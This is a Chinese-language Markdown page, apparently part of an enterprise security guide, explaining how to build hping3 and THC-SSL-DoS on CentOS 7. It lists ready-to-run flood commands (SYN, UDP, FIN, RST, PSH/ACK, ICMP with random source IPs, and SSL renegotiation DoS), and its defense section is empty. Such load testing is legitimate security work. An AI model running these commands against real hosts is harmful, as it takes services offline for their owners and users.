## 概述

## 利用工具
### hping3
[Hping3官网地址](http://www.hping.org/hping3.html)

* Centos7编译安装 ( Kali自带 )

```

# 解决环境依赖
yum install gcc.x86_64 libpcap-devel.x86_64 tcl-devel -y

# 下载
wget http://www.hping.org/hping3-20051105.tar.gz

# 解压并开始编译
tar -xf hping3-20051105.tar.gz && cd hping3-20051105
./configure

# 报错如图
```

![ddos-1](https://github.com/bloodzer0/Enterprise_Security_Build--Open_Source/blob/master/Infrastructure%20Security/Network%20Security/DoS%20DDoS%20CC/img/ddos-1.png)

```
# 修改文件，解决问题，修改如图
vim bytesex.h
```

![ddos-2](https://github.com/bloodzer0/Enterprise_Security_Build--Open_Source/blob/master/Infrastructure%20Security/Network%20Security/DoS%20DDoS%20CC/img/ddos-2.png)

```
# 编译，此时报错如图
make
```

![ddos-3](https://github.com/bloodzer0/Enterprise_Security_Build--Open_Source/blob/master/Infrastructure%20Security/Network%20Security/DoS%20DDoS%20CC/img/ddos-3.png)

```
# 解决问题
ln -s /usr/include/pcap-bpf.h /usr/include/net/bpf.h

# 再次编译
make && make instal

# 安装成功
```

* hping3案例

```
# 测试SYN Flood
hping3 -S --flood -V -p PORT IP
hping3 -c 20000 -d 120 -S -w 64 -p PORT --flood --rand-source IP # 随机源IP

# 测试UDP Flood
hping3 --flood --rand-source --udp -p PORT IP

# 测试TCP FIN Flood
hping3 --flood --rand-source -F -p PORT IP

# 测试TCP RST Flood
hping3 --flood --rand-source -R -p PORT IP

# 测试PUSH和ACK Flood
hping3 --flood --rand-source -PA -p PORT IP

# 测试ICMP和IGMP Flood
hping3 --flood --rand-source -1 -p PORT IP
```

### Thc-SSL-DoS
* Centos7编译安装 ( kali自带 )

```
# 解决环境依赖
yum install gcc.x86_64 openssl-devel.x86_64 -y

# 下载
git clone git://git.kali.org/packages/thc-ssl-dos.git && cd thc-ssl-dos

# 编译安装
./configure

make && make install
```

* thc-ssl-doS使用

```
thc-ssl-dos -l 500 IP PORT --accept
```

## 防御
